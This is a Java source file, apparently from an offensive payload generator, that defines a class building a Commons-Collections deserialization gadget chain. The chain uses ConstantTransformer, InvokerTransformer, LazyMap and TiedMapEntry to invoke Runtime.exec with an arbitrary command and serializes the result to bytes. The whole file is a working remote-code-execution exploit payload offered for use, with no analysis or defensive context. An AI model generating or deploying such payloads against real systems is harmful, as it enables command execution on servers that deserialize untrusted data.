package cn.safe6.payload.shortPayload.payload;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CCK3 extends Payload {
    @SuppressWarnings("all")
    public static byte[] getPayloadUseCommand(String cmd) {
        try {
            final Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{
                            String.class, Class[].class}, new Object[]{
                            "getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{
                            Object.class, Object[].class}, new Object[]{
                            null, new Object[0]}),
                    new InvokerTransformer("exec",
                            new Class[]{String.class}, new Object[]{cmd}),
                    new ConstantTransformer(new HashSet<String>())};
            ChainedTransformer inertChain = new ChainedTransformer(new Transformer[]{});
            HashMap<String, String> innerMap = new HashMap<String, String>();
            Map m = LazyMap.decorate(innerMap, inertChain);
            Map outerMap = new HashMap();
            TiedMapEntry tied = new TiedMapEntry(m, "v");
            outerMap.put(tied, "t");
            innerMap.clear();
            setFieldValue(inertChain, "iTransformers", transformers);
            return serialize(outerMap);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new byte[]{};
    }
}
